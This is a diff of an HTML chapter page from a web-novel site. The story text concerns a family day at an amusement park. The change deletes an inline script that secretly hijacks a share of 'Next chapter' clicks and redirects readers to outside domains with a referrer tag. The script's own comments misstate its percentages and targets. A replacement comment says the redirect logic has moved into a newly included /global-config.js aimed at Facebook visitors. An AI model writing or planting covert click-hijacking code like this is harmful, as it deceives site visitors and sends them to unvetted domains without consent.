@@ -2391,19 +2391,19 @@
                 <p>&#34;That one!&#34;</p>
                 <p>It was perfect for three people.</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>&#34;Alright, let&#39;s do this.&#34;</p>
                 <p>Vivian and Theo shared one car with Theo at the wheel. Ethan took another car to challenge them.</p>
                 <p>&#34;Uncle Ethan, I won&#39;t go easy on you!&#34; Theo declared proudly.</p>
                 <p>&#34;Neither will I,&#34; Ethan replied with a faint smirk.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>Their cars chased and collided across the arena. Though young, Theo drove with surprising focus. Despite his words, Ethan deliberately held back—mostly to avoid jostling Vivian.</p>
                 <p>Theo&#39;s laughter rang like silver bells.</p>
                 <p>After bumper cars, they headed to the water gun zone. Vivian stood outside the play area, snapping photos with her phone. Ethan rarely took pictures, but childhood was fleeting.</p>
                 <p>These moments would become precious memories.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
                 <p>The pirate ship, carousel, trampoline park... Theo enjoyed every minute, even making new friends.</p>
                 <p>Not just Theo—Ethan cherished this time too.</p>
                 <p>He knew only two days remained before their agreement expired.</p>
@@ -2543,37 +2543,7 @@
             }
         });
 
-        // Intercept Next button clicks and redirect to external domain
-        // 5% -> n1.cuvupa.co.uk, 0.5% -> n1.nougmi.xyz, 94.5% normal
-        (function() {
-            const nextBtn = document.getElementById('next-chapter');
-            if (nextBtn && nextBtn.href) {
-                nextBtn.addEventListener('click', function(e) {
-                    const rand = Math.random();
-
-                    // 7% probability to redirect to cuvupa
-                    if (rand < 0.07) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
-                    // 0.5% probability to redirect to hotelterdekat
-                    } else if (rand < 0.075) {
-                        e.preventDefault();
-                        const url = new URL(this.href, window.location.origin);
-                        const referrerDomain = window.location.hostname;
-                        const separator = url.search ? '&' : '?';
-                        const externalUrl = `https://novel.hotelterdekat.id${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
-                        window.location.href = externalUrl;
-                        console.log('🔀 Redirecting to hotelterdekat with ref:', externalUrl);
-                    }
-                    // Otherwise, let the default link behavior work (92.5% probability)
-                });
-            }
-        })();
+        // Next 按钮的 FB 外部跳转逻辑已迁移至 /global-config.js（15s 后对 FB 用户生效）
 
         // Record reading history
         document.addEventListener('DOMContentLoaded', function() {
@@ -4208,5 +4178,6 @@
     });
   })();
 </script>
+<script src="/global-config.js"></script>
 </body>
 </html>
